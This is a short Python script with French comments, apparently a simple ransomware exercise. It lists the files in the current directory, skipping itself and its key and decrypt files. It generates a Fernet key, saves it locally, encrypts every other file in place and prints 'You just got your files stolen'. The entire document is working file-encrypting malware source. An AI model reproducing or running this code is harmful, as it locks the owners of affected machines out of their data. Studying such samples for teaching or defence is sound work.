#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#Recuperation des fichiers

fichiers = []

for fichier in os.listdir():
	if fichier != "darkvador.py" and fichier != "clechiffrement.key" and fichier != "decrypt.py"  and os.path.isfile(fichier):
		fichiers.append(fichier)

print(fichiers)

#Generer une cle symetrique pour le chiffrement
cle = Fernet.generate_key()

with open("clechiffrement.key", "wb") as clechiffrement:
	clechiffrement.write(cle)


#chiffrer le contenu de chaque fichier
for fichier in fichiers:
	with open(fichier, "rb") as lefichier:
		contenu = lefichier.read()
	contenu_chiffre = Fernet(cle).encrypt(contenu)
	with open(fichier, "wb") as lefichier:
		lefichier.write(contenu_chiffre)

print("You just got your files stolen")
